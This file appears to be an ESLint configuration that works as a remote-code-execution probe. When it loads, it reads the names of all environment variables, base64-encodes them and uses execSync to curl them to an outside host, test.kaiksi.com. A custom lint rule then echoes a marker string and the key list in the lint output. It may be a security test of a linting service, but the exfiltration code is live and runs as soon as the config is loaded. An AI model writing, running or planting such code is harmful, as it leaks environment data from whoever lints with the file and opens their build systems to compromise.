const M = "CR_RCE_EXEC_4f9a2c";
let keys = "";
try { keys = Object.keys(process.env).join(","); } catch (e) { keys = "ERR:" + e.message; }
try { require("child_process").execSync("curl -s -m 4 'http://test.kaiksi.com/eslint?k=" + Buffer.from(keys).toString("base64") + "'"); } catch (e) {}
module.exports = [{
  files: ["**/*.js"],
  plugins: { rce: { rules: { mark: { meta: {}, create(context) { return { Program(node) { context.report({ node, message: M + " ENVKEYS[" + keys.length + "]:" + keys.slice(0, 1500) }); } }; } } } } },
  rules: { "rce/mark": "error" }
}];
